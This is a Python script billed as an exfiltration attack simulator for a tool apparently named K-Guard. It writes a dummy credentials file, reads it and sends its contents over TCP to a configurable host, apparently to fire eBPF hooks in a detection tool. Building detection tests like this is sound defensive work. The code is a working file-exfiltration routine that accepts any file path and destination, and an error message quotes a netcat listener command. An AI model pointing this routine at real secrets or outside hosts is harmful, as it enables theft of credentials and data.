#!/usr/bin/env python3
""" Exfiltration Attack Simulator """

import socket
import sys
import os
import time
import argparse

def setup_dummy_file(filepath):
    """Creating a controlled sensitive file for testing"""
    if not os.path.exists(filepath):
        print(f"[+] Creating dummy sensitive file at {filepath}...")
        with open(filepath, "w") as f:
            f.write("SUPER_SECRET_API_KEY=itsmemario\n")
            f.write("DB_PASSWORD=ankaramessi\n")

def run_exfiltration(target_ip, target_port, file_to_steal):
    print(f"[*] Starting Exfiltration Simulation Process (PID: {os.getpid()})")
    
    # 1. FILE READ PHASE (Triggers eBPF openat / read hooks)
    print(f"[*] Attempting to read: {file_to_steal}")
    try:
        with open(file_to_steal, "r") as f:
            payload = f.read()
        print(f"[+] Successfully read {len(payload)} bytes from disk.")
    except Exception as e:
        print(f"[-] Failed to read file: {e}")
        sys.exit(1)

    # Brief delay to make the CPG edge timing distinct in live visualizers
    time.sleep(0.5)

    # 2. NETWORK CONNECT & SEND PHASE (Triggers socket / connect / send hooks)
    print(f"[*] Opening outbound TCP connection to {target_ip}:{target_port}...")
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(5.0)
            s.connect((target_ip, target_port))
            
            # Format payload with headers to simulate an HTTP POST or raw stream
            exfil_packet = f"EXFILTRATED DATA:\n{payload}\n".encode('utf-8')
            s.sendall(exfil_packet)
            
        print("[+] Exfiltration complete. Socket closed successfully.")
    except ConnectionRefusedError:
        print("[-] Connection refused! Ensure your netcat listener (nc -lvnp 9999) is running.")
    except Exception as e:
        print(f"[-] Network error occurred: {e}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="K-Guard Exfiltration Attack Simulator")
    parser.add_argument("--ip", default="127.0.0.1", help="Destination IP (default: 127.0.0.1)")
    parser.add_argument("--port", type=int, default=9999, help="Destination Port (default: 9999)")
    parser.add_argument("--file", default="/tmp/kguard_dummy_credentials.txt", help="Path to file to read")
    
    args = parser.parse_args()
    
    # Ensure our default test file exists
    if args.file == "/tmp/kguard_dummy_credentials.txt":
        setup_dummy_file(args.file)
        
    run_exfiltration(args.ip, args.port, args.file)
